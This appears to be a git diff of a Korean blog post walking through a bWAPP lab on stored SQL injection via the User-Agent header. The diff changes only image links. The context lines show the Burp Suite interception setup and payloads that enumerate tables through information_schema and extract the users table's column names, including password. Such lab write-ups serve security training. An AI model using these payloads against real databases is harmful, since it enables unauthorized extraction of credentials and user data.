@@ -11,7 +11,7 @@ sqli_17.php 시나리오 접속
 
 security_level: low
 
-![Notion 이미지 1]({{ '/assets/images/posts/2026-11-06-sql-injection-stored-user-agent/01-410aa16a.png' | relative_url }})
+![Notion 이미지 1](https://raw.githubusercontent.com/syslians/syslians.github.io/main/assets/images/posts/2026-11-06-sql-injection-stored-user-agent/01-410aa16a.png)
 
 firefox network settings 
 
@@ -19,23 +19,23 @@ url에 about:preference:general
 
 network settings에서 http proxy에 버프슈트 주소 127.0.0.1:8080 으로 설정
 
-![Notion 이미지 2]({{ '/assets/images/posts/2026-11-06-sql-injection-stored-user-agent/02-410aa16a.png' | relative_url }})
+![Notion 이미지 2](https://raw.githubusercontent.com/syslians/syslians.github.io/main/assets/images/posts/2026-11-06-sql-injection-stored-user-agent/02-410aa16a.png)
 
 버프슈트 에서 interface 127.0.0.1:8080 설정
 
-![Notion 이미지 3]({{ '/assets/images/posts/2026-11-06-sql-injection-stored-user-agent/03-410aa16a.png' | relative_url }})
+![Notion 이미지 3](https://raw.githubusercontent.com/syslians/syslians.github.io/main/assets/images/posts/2026-11-06-sql-injection-stored-user-agent/03-410aa16a.png)
 
 intercept on
 
-![Notion 이미지 4]({{ '/assets/images/posts/2026-11-06-sql-injection-stored-user-agent/04-410aa16a.png' | relative_url }})
+![Notion 이미지 4](https://raw.githubusercontent.com/syslians/syslians.github.io/main/assets/images/posts/2026-11-06-sql-injection-stored-user-agent/04-410aa16a.png)
 
 새로고침을 하면 버프슈트에서 가로채는지 확인
 
-![Notion 이미지 5]({{ '/assets/images/posts/2026-11-06-sql-injection-stored-user-agent/05-410aa16a.png' | relative_url }})
+![Notion 이미지 5](https://raw.githubusercontent.com/syslians/syslians.github.io/main/assets/images/posts/2026-11-06-sql-injection-stored-user-agent/05-410aa16a.png)
 
 low_level은 $data를 받아서 추가적인 체크 로직을 호출하지 않는다.
 
-![Notion 이미지 6]({{ '/assets/images/posts/2026-11-06-sql-injection-stored-user-agent/06-410aa16a.png' | relative_url }})
+![Notion 이미지 6](https://raw.githubusercontent.com/syslians/syslians.github.io/main/assets/images/posts/2026-11-06-sql-injection-stored-user-agent/06-410aa16a.png)
 
 ### 1. user-agent ingection 실습
 
@@ -53,11 +53,11 @@ low_level은 $data를 받아서 추가적인 체크 로직을 호출하지 않�
 
 제일 먼저 information_schema 데이터베이스에 접근한후 
 
-![Notion 이미지 7]({{ '/assets/images/posts/2026-11-06-sql-injection-stored-user-agent/07-410aa16a.png' | relative_url }})
+![Notion 이미지 7](https://raw.githubusercontent.com/syslians/syslians.github.io/main/assets/images/posts/2026-11-06-sql-injection-stored-user-agent/07-410aa16a.png)
 
 mysql이 가지고 있는 데이터베이스 목록들을 뽑아낸다.
 
-![Notion 이미지 8]({{ '/assets/images/posts/2026-11-06-sql-injection-stored-user-agent/08-410aa16a.png' | relative_url }})
+![Notion 이미지 8](https://raw.githubusercontent.com/syslians/syslians.github.io/main/assets/images/posts/2026-11-06-sql-injection-stored-user-agent/08-410aa16a.png)
 
 ### 1. mysql 데이터베이스 목록 확인(information_schema)
 
@@ -69,39 +69,39 @@ abcd', (SELECT table_name FROM information_schema.tables WHERE table_schema=data
 
 버프슈트에서 user-agent 필드에 injection 코드를 넣는다.
 
-![Notion 이미지 9]({{ '/assets/images/posts/2026-11-06-sql-injection-stored-user-agent/09-410aa16a.png' | relative_url }})
+![Notion 이미지 9](https://raw.githubusercontent.com/syslians/syslians.github.io/main/assets/images/posts/2026-11-06-sql-injection-stored-user-agent/09-410aa16a.png)
 
 수정 후 forward
 
 bWAPP에서 확인
 
-![Notion 이미지 10]({{ '/assets/images/posts/2026-11-06-sql-injection-stored-user-agent/10-410aa16a.png' | relative_url }})
+![Notion 이미지 10](https://raw.githubusercontent.com/syslians/syslians.github.io/main/assets/images/posts/2026-11-06-sql-injection-stored-user-agent/10-410aa16a.png)
 
 현재 시나리오에서는 기본적으로 bWAPP 테이블을 사용하기 때문에 bWAPP의 첫번째 행인 blog가 IP_Address 컬럼에 들어가고, user-agent컬럼에 abcd가 들어간것을 확인할 수 있다. 이후 limit 0,1 → 1,1 → 2,1 값으로 증가시키면서 각 행들을 뽑아낼수 있다. 
 
-![Notion 이미지 11]({{ '/assets/images/posts/2026-11-06-sql-injection-stored-user-agent/11-410aa16a.png' | relative_url }})
+![Notion 이미지 11](https://raw.githubusercontent.com/syslians/syslians.github.io/main/assets/images/posts/2026-11-06-sql-injection-stored-user-agent/11-410aa16a.png)
 
 ```sql
 abcd', (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1)) #
 ```
 
-![Notion 이미지 12]({{ '/assets/images/posts/2026-11-06-sql-injection-stored-user-agent/12-410aa16a.png' | relative_url }})
+![Notion 이미지 12](https://raw.githubusercontent.com/syslians/syslians.github.io/main/assets/images/posts/2026-11-06-sql-injection-stored-user-agent/12-410aa16a.png)
 
 ```sql
 abcd', (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 2,1)) #
 ```
 
-![Notion 이미지 13]({{ '/assets/images/posts/2026-11-06-sql-injection-stored-user-agent/13-410aa16a.png' | relative_url }})
+![Notion 이미지 13](https://raw.githubusercontent.com/syslians/syslians.github.io/main/assets/images/posts/2026-11-06-sql-injection-stored-user-agent/13-410aa16a.png)
 
 ```sql
 abcd', (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 3,1)) #
 ```
 
-![Notion 이미지 14]({{ '/assets/images/posts/2026-11-06-sql-injection-stored-user-agent/14-410aa16a.png' | relative_url }})
+![Notion 이미지 14](https://raw.githubusercontent.com/syslians/syslians.github.io/main/assets/images/posts/2026-11-06-sql-injection-stored-user-agent/14-410aa16a.png)
 
-![Notion 이미지 15]({{ '/assets/images/posts/2026-11-06-sql-injection-stored-user-agent/15-410aa16a.png' | relative_url }})
+![Notion 이미지 15](https://raw.githubusercontent.com/syslians/syslians.github.io/main/assets/images/posts/2026-11-06-sql-injection-stored-user-agent/15-410aa16a.png)
 
-![Notion 이미지 16]({{ '/assets/images/posts/2026-11-06-sql-injection-stored-user-agent/16-410aa16a.png' | relative_url }})
+![Notion 이미지 16](https://raw.githubusercontent.com/syslians/syslians.github.io/main/assets/images/posts/2026-11-06-sql-injection-stored-user-agent/16-410aa16a.png)
 
 ```sql
 abcd', (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 4,1)) #
@@ -113,7 +113,7 @@ abcd', (SELECT table_name FROM information_schema.tables WHERE table_schema=data
 abcd', (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema='bWAPP' AND table_name='users')) #
 ```
 
-![Notion 이미지 17]({{ '/assets/images/posts/2026-11-06-sql-injection-stored-user-agent/17-410aa16a.png' | relative_url }})
+![Notion 이미지 17](https://raw.githubusercontent.com/syslians/syslians.github.io/main/assets/images/posts/2026-11-06-sql-injection-stored-user-agent/17-410aa16a.png)
 
 id, login, password, email, secret, activation_code, act 컬럼들을 확인할 수 있다.
 
